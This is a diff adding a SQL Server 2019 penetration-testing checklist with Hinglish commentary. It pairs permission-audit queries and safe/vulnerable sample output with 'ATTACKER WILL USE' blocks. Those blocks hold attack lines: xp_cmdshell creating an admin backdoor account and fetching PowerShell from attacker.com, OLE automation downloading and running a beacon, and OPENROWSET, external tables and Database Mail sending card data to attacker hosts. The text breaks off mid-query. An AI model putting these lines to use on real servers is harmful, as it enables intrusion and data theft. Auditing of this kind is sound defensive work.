@@ -1,0 +1,2417 @@
+================================================================
+COMPLETE SQL SERVER 2019 PENTEST FRAMEWORK - ALL COMMANDS
+HAR COMMAND MEIN KAUN KYA KAR SAKTA HAI - SAFE vs VULNERABLE
+================================================================
+
+Purpose: Ye framework har possible SQL Server vulnerability cover karta hai.
+Har command ke saath STEP-BY-STEP permission checks, SAFE/VULNERABLE output,
+aur actual attack vectors diye gaye hain.
+
+Total Commands: 30+ (Sabhi attack vectors cover kiye gaye hain)
+
+================================================================
+COMMAND 1: XP_CMDSHELL - OS COMMAND EXECUTION (RCE)
+================================================================
+
+STEP 1.1: Check if xp_cmdshell is enabled
+SELECT name, value_in_use 
+FROM sys.configurations 
+WHERE name = 'xp_cmdshell';
+
+SAFE OUTPUT:
+name        | value_in_use
+------------|-------------
+xp_cmdshell | 0
+
+VULNERABLE OUTPUT:
+name        | value_in_use
+------------|-------------
+xp_cmdshell | 1
+
+================================================================
+
+STEP 1.2: Check who has EXECUTE permission on xp_cmdshell
+SELECT 
+    p.name AS grantee,
+    p.type_desc,
+    p.is_disabled,
+    pp.permission_name,
+    pp.state_desc AS permission_state,
+    CASE 
+        WHEN p.is_disabled = 1 THEN '❌ Account Disabled - Cannot Execute'
+        WHEN pp.permission_name IS NULL THEN '⚠️ No Direct Permission - Check Role Membership'
+        WHEN pp.permission_name = 'EXECUTE' AND pp.state_desc = 'GRANT' THEN '✅ Can Execute xp_cmdshell'
+        WHEN pp.permission_name = 'EXECUTE' AND pp.state_desc = 'DENY' THEN '❌ Explicitly Denied - Cannot Execute'
+        ELSE '⚠️ Check Role Membership'
+    END AS execution_status
+FROM sys.server_principals p
+LEFT JOIN sys.server_permissions pp 
+    ON p.principal_id = pp.grantee_principal_id 
+    AND pp.permission_name = 'EXECUTE'
+    AND pp.class = 0
+    AND pp.major_id = 0
+WHERE p.type IN ('S', 'U', 'G')
+AND p.name NOT LIKE '##%'
+ORDER BY p.name;
+
+SAFE OUTPUT:
+grantee | type_desc | is_disabled | permission_name | permission_state | execution_status
+--------|-----------|-------------|-----------------|------------------|------------------
+app_user| SQL_LOGIN | 0           | NULL            | NULL             | ⚠️ No Direct Permission - Check Role Membership
+
+VULNERABLE OUTPUT:
+grantee | type_desc | is_disabled | permission_name | permission_state | execution_status
+--------|-----------|-------------|-----------------|------------------|------------------
+app_user| SQL_LOGIN | 0           | EXECUTE         | GRANT            | ✅ Can Execute xp_cmdshell
+
+================================================================
+
+STEP 1.3: Check who is in sysadmin (can execute xp_cmdshell by default)
+SELECT 
+    r.name AS role_name,
+    m.name AS member_name,
+    m.type_desc,
+    m.is_disabled,
+    '✅ Can execute xp_cmdshell via sysadmin role' AS execution_status
+FROM sys.server_role_members srm
+JOIN sys.server_principals r ON srm.role_principal_id = r.principal_id
+JOIN sys.server_principals m ON srm.member_principal_id = m.principal_id
+WHERE r.name = 'sysadmin'
+AND m.is_disabled = 0;
+
+SAFE OUTPUT:
+role_name | member_name | type_desc | is_disabled | execution_status
+----------|-------------|-----------|-------------|------------------
+sysadmin  | DOMAIN\svc_sql | WINDOWS_USER | 0 | ✅ Can execute xp_cmdshell via sysadmin role
+
+VULNERABLE OUTPUT:
+role_name | member_name | type_desc | is_disabled | execution_status
+----------|-------------|-----------|-------------|------------------
+sysadmin  | app_user    | SQL_LOGIN  | 0          | ✅ Can execute xp_cmdshell via sysadmin role
+sysadmin  | test_user   | SQL_LOGIN  | 0          | ✅ Can execute xp_cmdshell via sysadmin role
+
+================================================================
+
+STEP 1.4: Check current user's permission
+SELECT 
+    SUSER_SNAME() AS current_login,
+    IS_SRVROLEMEMBER('sysadmin') AS is_sysadmin,
+    HAS_PERMS_BY_NAME('xp_cmdshell', 'OBJECT', 'EXECUTE') AS can_execute_xp_cmdshell,
+    CASE 
+        WHEN IS_SRVROLEMEMBER('sysadmin') = 1 THEN '✅ CAN EXECUTE xp_cmdshell (sysadmin)'
+        WHEN HAS_PERMS_BY_NAME('xp_cmdshell', 'OBJECT', 'EXECUTE') = 1 THEN '✅ CAN EXECUTE xp_cmdshell (explicit permission)'
+        ELSE '❌ CANNOT EXECUTE xp_cmdshell'
+    END AS execution_status;
+
+SAFE OUTPUT:
+current_login | is_sysadmin | can_execute_xp_cmdshell | execution_status
+--------------|-------------|-------------------------|------------------
+app_user      | 0           | 0                       | ❌ CANNOT EXECUTE xp_cmdshell
+
+VULNERABLE OUTPUT:
+current_login | is_sysadmin | can_execute_xp_cmdshell | execution_status
+--------------|-------------|-------------------------|------------------
+app_user      | 1           | 1                       | ✅ CAN EXECUTE xp_cmdshell (sysadmin)
+
+================================================================
+ATTACKER WILL USE (if can execute):
+EXEC xp_cmdshell 'whoami';
+EXEC xp_cmdshell 'ipconfig /all';
+EXEC xp_cmdshell 'net user hacker P@ssw0rd /add';
+EXEC xp_cmdshell 'net localgroup administrators hacker /add';
+EXEC xp_cmdshell 'powershell -c "Invoke-Expression (New-Object Net.WebClient).DownloadString(''http://attacker.com/ps.ps1'')"';
+
+================================================================
+COMMAND 2: CLR (COMMON LANGUAGE RUNTIME) - CODE EXECUTION
+================================================================
+
+STEP 2.1: Check CLR status
+SELECT name, value_in_use 
+FROM sys.configurations 
+WHERE name IN ('clr enabled', 'clr strict security');
+
+SAFE OUTPUT:
+name            | value_in_use
+----------------|-------------
+clr enabled     | 0
+clr strict security | 1
+
+VULNERABLE OUTPUT:
+name            | value_in_use
+----------------|-------------
+clr enabled     | 1
+clr strict security | 0
+
+================================================================
+
+STEP 2.2: Check who can create/execute CLR assemblies
+SELECT 
+    p.name AS grantee,
+    p.type_desc,
+    p.is_disabled,
+    pp.permission_name,
+    pp.state_desc,
+    CASE 
+        WHEN pp.permission_name = 'CREATE ASSEMBLY' AND pp.state_desc = 'GRANT' THEN '✅ Can create CLR assemblies'
+        WHEN pp.permission_name = 'CREATE ASSEMBLY' AND pp.state_desc = 'DENY' THEN '❌ Cannot create CLR assemblies'
+        WHEN IS_SRVROLEMEMBER('sysadmin') = 1 THEN '✅ Can create CLR assemblies (sysadmin)'
+        ELSE '❌ Cannot create CLR assemblies'
+    END AS execution_status
+FROM sys.server_principals p
+LEFT JOIN sys.server_permissions pp 
+    ON p.principal_id = pp.grantee_principal_id 
+    AND pp.permission_name = 'CREATE ASSEMBLY'
+WHERE p.type IN ('S', 'U', 'G')
+AND p.name NOT LIKE '##%'
+ORDER BY p.name;
+
+SAFE OUTPUT:
+grantee | type_desc | is_disabled | permission_name | state_desc | execution_status
+--------|-----------|-------------|-----------------|------------|------------------
+app_user| SQL_LOGIN | 0           | NULL            | NULL       | ❌ Cannot create CLR assemblies
+
+VULNERABLE OUTPUT:
+grantee | type_desc | is_disabled | permission_name | state_desc | execution_status
+--------|-----------|-------------|-----------------|------------|------------------
+app_user| SQL_LOGIN | 0           | CREATE ASSEMBLY | GRANT      | ✅ Can create CLR assemblies
+
+================================================================
+
+STEP 2.3: Check current user's CLR permission
+SELECT 
+    SUSER_SNAME() AS current_login,
+    IS_SRVROLEMEMBER('sysadmin') AS is_sysadmin,
+    HAS_PERMS_BY_NAME('', 'SERVER', 'CREATE ASSEMBLY') AS can_create_assembly,
+    CASE 
+        WHEN IS_SRVROLEMEMBER('sysadmin') = 1 THEN '✅ Can create CLR assemblies (sysadmin)'
+        WHEN HAS_PERMS_BY_NAME('', 'SERVER', 'CREATE ASSEMBLY') = 1 THEN '✅ Can create CLR assemblies'
+        ELSE '❌ Cannot create CLR assemblies'
+    END AS execution_status;
+
+SAFE OUTPUT:
+current_login | is_sysadmin | can_create_assembly | execution_status
+--------------|-------------|---------------------|------------------
+app_user      | 0           | 0                   | ❌ Cannot create CLR assemblies
+
+VULNERABLE OUTPUT:
+current_login | is_sysadmin | can_create_assembly | execution_status
+--------------|-------------|---------------------|------------------
+app_user      | 0           | 1                   | ✅ Can create CLR assemblies
+
+================================================================
+ATTACKER WILL USE (if can create assembly):
+CREATE ASSEMBLY Malicious
+FROM 0x4D5A90000300000004000000FFFF0000...
+WITH PERMISSION_SET = UNSAFE;
+
+CREATE PROCEDURE Exploit 
+AS EXTERNAL NAME Malicious.Class.Method;
+
+EXEC Exploit; -- Executes arbitrary .NET code
+
+================================================================
+COMMAND 3: OLE AUTOMATION PROCEDURES - RCE
+================================================================
+
+STEP 3.1: Check OLE Automation status
+SELECT name, value_in_use 
+FROM sys.configurations 
+WHERE name = 'Ole Automation Procedures';
+
+SAFE OUTPUT:
+name                    | value_in_use
+------------------------|-------------
+Ole Automation Procedures | 0
+
+VULNERABLE OUTPUT:
+name                    | value_in_use
+------------------------|-------------
+Ole Automation Procedures | 1
+
+================================================================
+
+STEP 3.2: Check who has execute permission on OLE stored procedures
+SELECT 
+    p.name AS grantee,
+    p.type_desc,
+    p.is_disabled,
+    pp.permission_name,
+    pp.state_desc,
+    CASE 
+        WHEN pp.permission_name IN ('EXECUTE', 'CONTROL') AND pp.state_desc = 'GRANT' THEN '✅ Can execute OLE Automation'
+        WHEN IS_SRVROLEMEMBER('sysadmin') = 1 THEN '✅ Can execute OLE Automation (sysadmin)'
+        ELSE '❌ Cannot execute OLE Automation'
+    END AS execution_status
+FROM sys.server_principals p
+LEFT JOIN sys.server_permissions pp 
+    ON p.principal_id = pp.grantee_principal_id 
+    AND pp.permission_name IN ('EXECUTE', 'CONTROL')
+WHERE p.type IN ('S', 'U', 'G')
+AND p.name NOT LIKE '##%'
+ORDER BY p.name;
+
+SAFE OUTPUT:
+grantee | type_desc | is_disabled | permission_name | state_desc | execution_status
+--------|-----------|-------------|-----------------|------------|------------------
+app_user| SQL_LOGIN | 0           | NULL            | NULL       | ❌ Cannot execute OLE Automation
+
+VULNERABLE OUTPUT:
+grantee | type_desc | is_disabled | permission_name | state_desc | execution_status
+--------|-----------|-------------|-----------------|------------|------------------
+app_user| SQL_LOGIN | 0           | EXECUTE         | GRANT      | ✅ Can execute OLE Automation
+
+================================================================
+
+STEP 3.3: Check OLE procedures permission
+SELECT 
+    'sp_OACreate' AS procedure_name,
+    HAS_PERMS_BY_NAME('sp_OACreate', 'OBJECT', 'EXECUTE') AS can_execute,
+    CASE 
+        WHEN HAS_PERMS_BY_NAME('sp_OACreate', 'OBJECT', 'EXECUTE') = 1 THEN '✅ Can use OLE Automation'
+        WHEN IS_SRVROLEMEMBER('sysadmin') = 1 THEN '✅ Can use OLE Automation (sysadmin)'
+        ELSE '❌ Cannot use OLE Automation'
+    END AS execution_status
+UNION ALL
+SELECT 
+    'sp_OAMethod',
+    HAS_PERMS_BY_NAME('sp_OAMethod', 'OBJECT', 'EXECUTE'),
+    CASE 
+        WHEN HAS_PERMS_BY_NAME('sp_OAMethod', 'OBJECT', 'EXECUTE') = 1 THEN '✅ Can use OLE Automation'
+        WHEN IS_SRVROLEMEMBER('sysadmin') = 1 THEN '✅ Can use OLE Automation (sysadmin)'
+        ELSE '❌ Cannot use OLE Automation'
+    END
+UNION ALL
+SELECT 
+    'sp_OADestroy',
+    HAS_PERMS_BY_NAME('sp_OADestroy', 'OBJECT', 'EXECUTE'),
+    CASE 
+        WHEN HAS_PERMS_BY_NAME('sp_OADestroy', 'OBJECT', 'EXECUTE') = 1 THEN '✅ Can use OLE Automation'
+        WHEN IS_SRVROLEMEMBER('sysadmin') = 1 THEN '✅ Can use OLE Automation (sysadmin)'
+        ELSE '❌ Cannot use OLE Automation'
+    END;
+
+SAFE OUTPUT:
+procedure_name | can_execute | execution_status
+---------------|-------------|------------------
+sp_OACreate    | 0           | ❌ Cannot use OLE Automation
+sp_OAMethod    | 0           | ❌ Cannot use OLE Automation
+sp_OADestroy   | 0           | ❌ Cannot use OLE Automation
+
+VULNERABLE OUTPUT:
+procedure_name | can_execute | execution_status
+---------------|-------------|------------------
+sp_OACreate    | 1           | ✅ Can use OLE Automation
+sp_OAMethod    | 1           | ✅ Can use OLE Automation
+sp_OADestroy   | 1           | ✅ Can use OLE Automation
+
+================================================================
+ATTACKER WILL USE (if can execute):
+DECLARE @cmd INT;
+EXEC sp_OACreate 'WScript.Shell', @cmd OUTPUT;
+EXEC sp_OAMethod @cmd, 'Run', NULL, 'cmd.exe /c whoami > C:\temp\out.txt';
+EXEC sp_OAMethod @cmd, 'Run', NULL, 'powershell -c "Invoke-WebRequest -Uri http://attacker.com/beacon.exe -OutFile C:\temp\beacon.exe"';
+EXEC sp_OAMethod @cmd, 'Run', NULL, 'C:\temp\beacon.exe';
+
+================================================================
+COMMAND 4: AD HOC DISTRIBUTED QUERIES - DATA EXFILTRATION
+================================================================
+
+STEP 4.1: Check Ad Hoc Distributed Queries status
+SELECT name, value_in_use 
+FROM sys.configurations 
+WHERE name = 'Ad Hoc Distributed Queries';
+
+SAFE OUTPUT:
+name                    | value_in_use
+------------------------|-------------
+Ad Hoc Distributed Queries | 0
+
+VULNERABLE OUTPUT:
+name                    | value_in_use
+------------------------|-------------
+Ad Hoc Distributed Queries | 1
+
+================================================================
+
+STEP 4.2: Check who can use OPENROWSET/OPENDATASOURCE
+SELECT 
+    p.name AS grantee,
+    p.type_desc,
+    p.is_disabled,
+    pp.permission_name,
+    pp.state_desc,
+    CASE 
+        WHEN pp.permission_name = 'CONNECT' AND pp.state_desc = 'GRANT' THEN '✅ Can use Ad Hoc queries'
+        WHEN IS_SRVROLEMEMBER('sysadmin') = 1 THEN '✅ Can use Ad Hoc queries (sysadmin)'
+        ELSE '❌ Cannot use Ad Hoc queries'
+    END AS execution_status
+FROM sys.server_principals p
+LEFT JOIN sys.server_permissions pp 
+    ON p.principal_id = pp.grantee_principal_id 
+    AND pp.permission_name = 'CONNECT'
+WHERE p.type IN ('S', 'U', 'G')
+AND p.name NOT LIKE '##%'
+ORDER BY p.name;
+
+SAFE OUTPUT:
+grantee | type_desc | is_disabled | permission_name | state_desc | execution_status
+--------|-----------|-------------|-----------------|------------|------------------
+app_user| SQL_LOGIN | 0           | NULL            | NULL       | ❌ Cannot use Ad Hoc queries
+
+VULNERABLE OUTPUT:
+grantee | type_desc | is_disabled | permission_name | state_desc | execution_status
+--------|-----------|-------------|-----------------|------------|------------------
+app_user| SQL_LOGIN | 0           | CONNECT         | GRANT      | ✅ Can use Ad Hoc queries
+
+================================================================
+
+STEP 4.3: Check current user's Ad Hoc permission
+SELECT 
+    SUSER_SNAME() AS current_user,
+    CASE 
+        WHEN IS_SRVROLEMEMBER('sysadmin') = 1 THEN '✅ Can use OPENROWSET (sysadmin)'
+        WHEN HAS_PERMS_BY_NAME('', 'SERVER', 'CONNECT') = 1 THEN '✅ Can use OPENROWSET'
+        ELSE '❌ Cannot use OPENROWSET'
+    END AS openrowset_access;
+
+SAFE OUTPUT:
+current_user | openrowset_access
+-------------|-------------------
+app_user     | ❌ Cannot use OPENROWSET
+
+VULNERABLE OUTPUT:
+current_user | openrowset_access
+-------------|-------------------
+app_user     | ✅ Can use OPENROWSET (sysadmin)
+
+================================================================
+ATTACKER WILL USE (if can use):
+-- Exfiltrate data to attacker server
+SELECT * INTO #temp 
+FROM OPENROWSET('SQLNCLI', 
+                'Server=attacker.com;Trusted_Connection=yes;', 
+                'SELECT * FROM CreditCards');
+
+-- Or send data directly
+INSERT INTO OPENROWSET('SQLNCLI', 'Server=attacker.com;Trusted_Connection=yes;',
+                       'SELECT * FROM CreditCards')
+SELECT * FROM CreditCards;
+
+================================================================
+COMMAND 5: DATABASE MAIL - PHISHING/SPAM/EXFIL
+================================================================
+
+STEP 5.1: Check Database Mail status
+SELECT name, value_in_use 
+FROM sys.configurations 
+WHERE name = 'Database Mail XPs';
+
+SAFE OUTPUT:
+name            | value_in_use
+----------------|-------------
+Database Mail XPs | 0
+
+VULNERABLE OUTPUT:
+name            | value_in_use
+----------------|-------------
+Database Mail XPs | 1
+
+================================================================
+
+STEP 5.2: Check who can send mail
+SELECT 
+    p.name AS grantee,
+    p.type_desc,
+    pp.permission_name,
+    pp.state_desc,
+    CASE 
+        WHEN pp.permission_name = 'EXECUTE' AND pp.state_desc = 'GRANT' THEN '✅ Can send mail'
+        WHEN IS_SRVROLEMEMBER('sysadmin') = 1 THEN '✅ Can send mail (sysadmin)'
+        ELSE '❌ Cannot send mail'
+    END AS mail_access
+FROM sys.database_principals p
+LEFT JOIN sys.database_permissions pp 
+    ON p.principal_id = pp.grantee_principal_id
+    AND pp.permission_name = 'EXECUTE'
+WHERE p.type IN ('S', 'U', 'G')
+AND p.principal_id > 4
+ORDER BY p.name;
+
+SAFE OUTPUT:
+grantee | type_desc | permission_name | state_desc | mail_access
+--------|-----------|-----------------|------------|------------
+app_user| SQL_USER  | NULL            | NULL       | ❌ Cannot send mail
+
+VULNERABLE OUTPUT:
+grantee | type_desc | permission_name | state_desc | mail_access
+--------|-----------|-----------------|------------|------------
+app_user| SQL_USER  | EXECUTE         | GRANT      | ✅ Can send mail
+
+================================================================
+ATTACKER WILL USE (if can send mail):
+EXEC msdb.dbo.sp_send_dbmail
+@profile_name = 'Admin Profile',
+@recipients = 'attacker@email.com',
+@subject = 'SQL Server Data',
+@query = 'SELECT * FROM CreditCards';
+
+================================================================
+COMMAND 6: REMOTE ADMIN CONNECTIONS (DAC) - REMOTE ACCESS
+================================================================
+
+STEP 6.1: Check remote admin connections
+SELECT name, value_in_use
+FROM sys.configurations
+WHERE name = 'remote admin connections';
+
+SAFE OUTPUT:
+name                   | value_in_use
+-----------------------|-------------
+remote admin connections | 0
+
+VULNERABLE OUTPUT:
+name                   | value_in_use
+-----------------------|-------------
+remote admin connections | 1
+
+================================================================
+
+STEP 6.2: Check who can use DAC
+SELECT 
+    SUSER_SNAME() AS current_user,
+    CASE 
+        WHEN IS_SRVROLEMEMBER('sysadmin') = 1 THEN '✅ Can connect via DAC (sysadmin)'
+        ELSE '❌ Cannot connect via DAC'
+    END AS dac_access;
+
+SAFE OUTPUT:
+current_user | dac_access
+-------------|-----------
+app_user     | ❌ Cannot connect via DAC
+
+VULNERABLE OUTPUT:
+current_user | dac_access
+-------------|-----------
+app_user     | ✅ Can connect via DAC (sysadmin)
+
+================================================================
+ATTACKER WILL USE (if DAC enabled):
+-- Connect with ADMIN:localhost,1434
+-- Even if SQL Server is down
+-- Bypass normal authentication
+
+================================================================
+COMMAND 7: REMOTE ACCESS - REMOTE CONNECTIONS
+================================================================
+
+STEP 7.1: Check remote access
+SELECT name, value_in_use
+FROM sys.configurations
+WHERE name = 'remote access';
+
+SAFE OUTPUT:
+name         | value_in_use
+-------------|-------------
+remote access | 1
+
+VULNERABLE OUTPUT:
+name         | value_in_use
+-------------|-------------
+remote access | 0
+
+================================================================
+
+STEP 7.2: Check remote access permissions
+SELECT 
+    p.name AS grantee,
+    p.type_desc,
+    pp.permission_name,
+    pp.state_desc,
+    CASE 
+        WHEN pp.permission_name = 'CONNECT SQL' AND pp.state_desc = 'GRANT' THEN '✅ Can connect remotely'
+        ELSE '❌ Cannot connect remotely'
+    END AS remote_access_status
+FROM sys.server_principals p
+LEFT JOIN sys.server_permissions pp 
+    ON p.principal_id = pp.grantee_principal_id
+    AND pp.permission_name = 'CONNECT SQL'
+WHERE p.type IN ('S', 'U', 'G')
+AND p.name NOT LIKE '##%'
+ORDER BY p.name;
+
+SAFE OUTPUT:
+grantee | type_desc | permission_name | state_desc | remote_access_status
+--------|-----------|-----------------|------------|----------------------
+app_user| SQL_LOGIN | CONNECT SQL     | GRANT      | ✅ Can connect remotely
+
+VULNERABLE OUTPUT:
+(No differences - this is default behavior)
+
+================================================================
+ATTACKER WILL USE:
+-- If remote access is disabled, still try to connect
+-- Sometimes misconfigured, connection might work
+sqlcmd -S target_server -U app_user -P password
+
+================================================================
+COMMAND 8: CROSS DATABASE OWNERSHIP CHAINING - EOP
+================================================================
+
+STEP 8.1: Check cross DB chaining
+SELECT name, is_db_chaining_on
+FROM sys.databases
+WHERE is_db_chaining_on = 1;
+
+SAFE OUTPUT:
+name | is_db_chaining_on
+-----|------------------
+(0 rows affected)
+
+VULNERABLE OUTPUT:
+name    | is_db_chaining_on
+--------|------------------
+ProdDB  | 1
+SalesDB | 1
+
+================================================================
+
+STEP 8.2: Check who can exploit cross DB chaining
+SELECT 
+    d.name AS database_name,
+    d.is_db_chaining_on,
+    p.name AS db_owner,
+    CASE 
+        WHEN d.is_db_chaining_on = 1 AND p.name = SUSER_SNAME() 
+        THEN '✅ Can exploit cross DB chaining'
+        WHEN d.is_db_chaining_on = 1 AND IS_SRVROLEMEMBER('sysadmin') = 1
+        THEN '✅ Can exploit cross DB chaining (sysadmin)'
+        ELSE '❌ Cannot exploit cross DB chaining'
+    END AS exploit_status
+FROM sys.databases d
+JOIN sys.database_principals p ON d.owner_sid = p.sid
+WHERE d.is_db_chaining_on = 1;
+
+SAFE OUTPUT:
+database_name | is_db_chaining_on | db_owner | exploit_status
+--------------|-------------------|----------|----------------
+(0 rows affected)
+
+VULNERABLE OUTPUT:
+database_name | is_db_chaining_on | db_owner | exploit_status
+--------------|-------------------|----------|----------------
+ProdDB        | 1                 | app_user | ✅ Can exploit cross DB chaining
+
+================================================================
+ATTACKER WILL USE (if chaining enabled):
+USE SalesDB;
+CREATE PROCEDURE sp_Steal
+AS
+BEGIN
+   SELECT * FROM ProdDB.dbo.CreditCards; -- Cross DB access
+END;
+
+================================================================
+COMMAND 9: CONTAINED DATABASE AUTHENTICATION - AUTH BYPASS
+================================================================
+
+STEP 9.1: Check contained database authentication
+SELECT name, value_in_use
+FROM sys.configurations
+WHERE name = 'contained database authentication';
+
+SAFE OUTPUT:
+name                           | value_in_use
+-------------------------------|-------------
+contained database authentication | 0
+
+VULNERABLE OUTPUT:
+name                           | value_in_use
+-------------------------------|-------------
+contained database authentication | 1
+
+================================================================
+
+STEP 9.2: Check contained databases
+SELECT name, containment_desc
+FROM sys.databases
+WHERE containment_desc != 'NONE';
+
+SAFE OUTPUT:
+name | containment_desc
+-----|-----------------
+(0 rows affected)
+
+VULNERABLE OUTPUT:
+name    | containment_desc
+--------|-----------------
+ProdDB  | PARTIAL
+SalesDB | PARTIAL
+
+================================================================
+
+STEP 9.3: Check contained users
+SELECT 
+    dp.name AS user_name,
+    dp.type_desc,
+    dp.authentication_type_desc,
+    CASE 
+        WHEN dp.authentication_type_desc = 'CONTAINED' 
+        THEN '✅ Contained user - Can authenticate without server login'
+        ELSE 'Not contained'
+    END AS contained_status
+FROM sys.database_principals dp
+WHERE dp.type IN ('S', 'U')
+AND dp.principal_id > 4;
+
+SAFE OUTPUT:
+user_name | type_desc | authentication_type_desc | contained_status
+----------|-----------|--------------------------|------------------
+app_user  | SQL_USER  | INSTANCE                 | Not contained
+
+VULNERABLE OUTPUT:
+user_name | type_desc | authentication_type_desc | contained_status
+----------|-----------|--------------------------|------------------
+app_user  | SQL_USER  | CONTAINED                | ✅ Contained user - Can authenticate without server login
+
+================================================================
+ATTACKER WILL USE:
+-- Connect directly to contained DB without server login
+-- Use contained user credentials
+sqlcmd -S target_server -d ContainedDB -U contained_user -P password
+
+================================================================
+COMMAND 10: STORED CREDENTIALS - CREDENTIAL THEFT
+================================================================
+
+STEP 10.1: Check stored credentials
+SELECT name, credential_identity, create_date, modify_date
+FROM sys.credentials;
+
+SAFE OUTPUT:
+name | credential_identity | create_date | modify_date
+-----|---------------------|-------------|------------
+(0 rows affected)
+
+VULNERABLE OUTPUT:
+name                | credential_identity   | create_date
+--------------------|-----------------------|------------------
+AzureCredential     | storageaccount        | 2024-01-15
+AdminProxyCred      | DOMAIN\Administrator  | 2024-02-20
+ETLProxyCred        | DOMAIN\svc_etl        | 2024-03-01
+
+================================================================
+
+STEP 10.2: Check who can use credentials
+SELECT 
+    p.name AS proxy_name,
+    p.enabled,
+    c.name AS credential_name,
+    c.credential_identity,
+    CASE 
+        WHEN c.credential_identity LIKE '%Administrator%' 
+        THEN '✅ HIGH PRIVILEGE CREDENTIAL'
+        ELSE 'Credential available'
+    END AS credential_status
+FROM msdb.dbo.sysproxies p
+LEFT JOIN sys.credentials c ON p.credential_id = c.credential_id
+WHERE p.enabled = 1;
+
+SAFE OUTPUT:
+proxy_name | enabled | credential_name | credential_identity | credential_status
+-----------|---------|-----------------|---------------------|------------------
+(0 rows affected)
+
+VULNERABLE OUTPUT:
+proxy_name  | enabled | credential_name | credential_identity | credential_status
+------------|---------|-----------------|---------------------|------------------
+Admin_Proxy | 1       | AdminCred       | DOMAIN\Administrator| ✅ HIGH PRIVILEGE CREDENTIAL
+ETL_Proxy   | 1       | ETLCred         | DOMAIN\svc_etl      | Credential available
+
+================================================================
+ATTACKER WILL USE:
+-- Check proxy access
+SELECT p.name, pl.principal_id, pp.name AS principal_name
+FROM msdb.dbo.sysproxies p
+JOIN msdb.dbo.sysproxylogin pl ON p.proxy_id = pl.proxy_id
+JOIN sys.server_principals pp ON pl.principal_id = pp.principal_id;
+
+-- Use proxy to execute commands with credential
+EXEC msdb.dbo.sp_add_job @job_name = 'Elevated_Job';
+EXEC msdb.dbo.sp_add_jobstep @job_name = 'Elevated_Job',
+  @step_name = 'Elevated_Cmd',
+  @subsystem = 'CmdExec',
+  @command = 'whoami',
+  @proxy_name = 'Admin_Proxy';
+
+================================================================
+COMMAND 11: DATABASE SCOPED CREDENTIALS - CREDENTIAL THEFT
+================================================================
+
+STEP 11.1: Check database scoped credentials
+SELECT name, credential_id, create_date
+FROM sys.database_scoped_credentials;
+
+SAFE OUTPUT:
+name | credential_id | create_date
+-----|---------------|------------
+(0 rows affected)
+
+VULNERABLE OUTPUT:
+name                        | credential_id | create_date
+----------------------------|---------------|------------
+AzureStorageCredential      | 1             | 2024-01-15
+ExternalTableCredential     | 2             | 2024-02-20
+
+================================================================
+
+STEP 11.2: Check who can use database scoped credentials
+SELECT 
+    p.name AS grantee,
+    p.type_desc,
+    CASE 
+        WHEN EXISTS (SELECT 1 FROM sys.database_permissions dp 
+                     WHERE dp.grantee_principal_id = p.principal_id
+                     AND dp.permission_name = 'REFERENCES')
+        THEN '✅ Can use database scoped credentials'
+        ELSE '❌ Cannot use database scoped credentials'
+    END AS credential_access
+FROM sys.database_principals p
+WHERE p.type IN ('S', 'U', 'G')
+AND p.principal_id > 4
+ORDER BY p.name;
+
+SAFE OUTPUT:
+grantee | type_desc | credential_access
+--------|-----------|------------------
+app_user| SQL_USER  | ❌ Cannot use database scoped credentials
+
+VULNERABLE OUTPUT:
+grantee | type_desc | credential_access
+--------|-----------|------------------
+app_user| SQL_USER  | ✅ Can use database scoped credentials
+
+================================================================
+ATTACKER WILL USE:
+-- Use credential to access external data
+CREATE EXTERNAL TABLE DataExfil 
+WITH (LOCATION = 'https://attacker.blob.core.windows.net/steal/')
+AS SELECT * FROM CreditCards;
+
+================================================================
+COMMAND 12: IMPERSONATION - PRIVILEGE ESCALATION
+================================================================
+
+STEP 12.1: Server-level impersonation
+SELECT 
+    g.name AS grantee,
+    g.type_desc,
+    g.is_disabled,
+    t.name AS target_principal,
+    t.type_desc,
+    t.is_disabled AS target_disabled,
+    CASE 
+        WHEN g.is_disabled = 1 THEN '❌ Grantee disabled - Cannot impersonate'
+        WHEN t.is_disabled = 1 THEN '❌ Target disabled - Cannot impersonate'
+        ELSE '✅ Can impersonate target'
+    END AS impersonation_status
+FROM sys.server_permissions sp
+JOIN sys.server_principals g ON sp.grantee_principal_id = g.principal_id
+JOIN sys.server_principals t ON sp.major_id = t.principal_id
+WHERE sp.permission_name = 'IMPERSONATE'
+AND g.type IN ('S', 'U', 'G')
+AND g.name NOT LIKE '##%'
+ORDER BY g.name;
+
+SAFE OUTPUT:
+grantee | type_desc | is_disabled | target_principal | type_desc | target_disabled | impersonation_status
+--------|-----------|-------------|------------------|-----------|-----------------|----------------------
+(0 rows affected)
+
+VULNERABLE OUTPUT:
+grantee | type_desc | is_disabled | target_principal | type_desc | target_disabled | impersonation_status
+--------|-----------|-------------|------------------|-----------|-----------------|----------------------
+app_user| SQL_LOGIN | 0           | sa               | SQL_LOGIN | 0               | ✅ Can impersonate target
+
+================================================================
+
+STEP 12.2: Database-level impersonation
+SELECT 
+    g.name AS grantee,
+    g.type_desc,
+    t.name AS target_principal,
+    t.type_desc,
+    CASE 
+        WHEN g.type IN ('SQL_USER', 'WINDOWS_USER') 
+        AND t.name IN ('dbo', 'db_owner') 
+        THEN '✅ Can impersonate dbo - CRITICAL'
+        ELSE '✅ Can impersonate target'
+    END AS impersonation_status
+FROM sys.database_permissions sp
+JOIN sys.database_principals g ON sp.grantee_principal_id = g.principal_id
+JOIN sys.database_principals t ON sp.major_id = t.principal_id
+WHERE sp.permission_name = 'IMPERSONATE'
+AND g.principal_id > 4
+ORDER BY g.name;
+
+SAFE OUTPUT:
+grantee | type_desc | target_principal | type_desc | impersonation_status
+--------|-----------|------------------|-----------|----------------------
+(0 rows affected)
+
+VULNERABLE OUTPUT:
+grantee | type_desc | target_principal | type_desc | impersonation_status
+--------|-----------|------------------|-----------|----------------------
+app_user| SQL_USER  | dbo              | DATABASE_PRINCIPAL| ✅ Can impersonate dbo - CRITICAL
+
+================================================================
+
+STEP 12.3: Check current user's impersonation ability
+SELECT 
+    SUSER_SNAME() AS current_login,
+    'sa' AS target,
+    CASE 
+        WHEN IS_SRVROLEMEMBER('sysadmin') = 1 THEN '✅ Can impersonate any login'
+        WHEN HAS_PERMS_BY_NAME('sa', 'LOGIN', 'IMPERSONATE') = 1 THEN '✅ Can impersonate sa'
+        ELSE '❌ Cannot impersonate sa'
+    END AS can_impersonate_sa
+UNION ALL
+SELECT 
+    SUSER_SNAME(),
+    'DOMAIN\Administrator',
+    CASE 
+        WHEN IS_SRVROLEMEMBER('sysadmin') = 1 THEN '✅ Can impersonate any login'
+        WHEN HAS_PERMS_BY_NAME('DOMAIN\Administrator', 'LOGIN', 'IMPERSONATE') = 1 THEN '✅ Can impersonate Administrator'
